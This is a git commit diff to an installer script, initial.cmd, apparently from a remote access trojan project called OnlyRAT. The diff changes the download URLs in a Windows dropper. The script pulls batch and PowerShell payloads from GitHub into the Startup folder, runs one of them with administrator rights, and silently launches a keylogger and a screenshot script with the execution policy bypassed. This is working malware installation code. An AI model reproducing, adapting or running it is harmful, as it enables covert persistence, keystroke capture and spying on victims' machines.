81e9298ad07a4427b061da43ddc93eda51e93be4
sayuru99 <saurudealwis@ymail.com>
2024-09-23 20:53:14 +0530

    ss

--- initial.cmd
+++ initial.cmd
@@ -19,10 +19,10 @@ ftype Microsoft.PowerShellScript.1="%SystemRoot%\system32\WindowsPowerShell\v1.0
 powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin/admin.bat', '%startup%\admin.bat')"
 powershell -c "Start-Process cmd.exe -ArgumentList '/c \"%startup%\admin.bat\"' -Verb RunAs"
 
-echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/keylogg.ps1' -OutFile 'keylogg.ps1'; Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%startup%\keylogg.ps1\"' -WindowStyle Hidden" > down.cmd
+echo powershell -c "Invoke-WebRequest -Uri 'https://github.com/lak200425/dododo/blob/daf08c77b8bb7f83a190398f48f1745d0f65f13c/key.ps1' -OutFile 'keylogg.ps1'; Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%startup%\keylogg.ps1\"' -WindowStyle Hidden" > down.cmd
 powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\down.cmd\"' -WindowStyle Hidden"
 
-powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/ss.ps1', '%startup%\ss.ps1')"
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lak200425/dododo/blob/daf08c77b8bb7f83a190398f48f1745d0f65f13c/ss.ps1', '%startup%\ss.ps1')"
 powershell -Command "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"%startup%\ss.ps1\"' -WindowStyle Hidden"
 
 cd /d "%initialPath%"
